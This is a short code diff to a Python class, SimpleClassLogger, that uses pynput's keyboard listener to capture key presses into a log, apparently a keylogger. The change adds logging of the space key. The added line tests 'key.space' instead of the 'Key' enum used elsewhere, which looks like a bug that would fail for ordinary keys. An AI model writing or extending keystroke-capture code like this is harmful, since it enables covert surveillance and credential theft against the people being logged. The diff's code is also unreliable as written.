@@ -25,9 +25,10 @@ class SimpleClassLogger:
                 self.append_to_log("[ENTER]") #includes ENTER key
             elif key == Key.caps_lock:
                 self.append_to_log("[CAPSLOCK]") #includes CAPSLOCK key
+            elif key == key.space:
+                self.append_to_log(" ") #includes SPACE key
             else:             
                 pass
-
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
         with keyboard_listener:
